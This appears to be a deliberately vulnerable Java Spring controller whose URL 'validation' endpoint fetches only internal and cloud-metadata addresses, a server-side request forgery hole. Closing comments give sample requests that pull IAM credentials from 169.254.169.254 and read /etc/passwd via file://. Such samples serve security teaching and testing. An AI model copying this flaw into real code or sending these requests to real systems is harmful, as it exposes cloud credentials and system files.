import java.io.*;
import java.net.*;
import java.util.*;
import org.springframework.stereotype.*;
import org.springframework.web.bind.annotation.*;

@RestController
@RequestMapping("/api/datasource")
public class DataSourceController {
    @Autowired
    private GenDatasourceConfServiceImpl datasourceService;

    @GetMapping("/validate")
    public String validateDataSource(@RequestParam String requestUrl) {
        try {
            return datasourceService.checkDataSource(requestUrl);
        } catch (Exception e) {
            return "Validation failed: " + e.getMessage();
        }
    }
}

@Service
class GenDatasourceConfServiceImpl {
    public String checkDataSource(String requestUrl) throws IOException {
        URL url = new URL(requestUrl);
        if (!isInternalIP(url.getHost())) {
            throw new IllegalArgumentException("Invalid IP address");
        }

        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.setConnectTimeout(5000);
        connection.setReadTimeout(5000);

        int responseCode = connection.getResponseCode();
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(responseCode == 200 ? 
                connection.getInputStream() : 
                connection.getErrorStream())
        );

        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            response.append(line);
        }
        return response.toString();
    }

    private boolean isInternalIP(String host) {
        try {
            InetAddress address = InetAddress.getByName(host);
            return address.isSiteLocalAddress() || 
                   address.isLoopbackAddress() ||
                   host.equals("169.254.169.254");
        } catch (UnknownHostException e) {
            return false;
        }
    }
}

// 漏洞触发示例：
// http://bank.example.com/api/datasource/validate?requestUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/
// http://bank.example.com/api/datasource/validate?requestUrl=file:///etc/passwd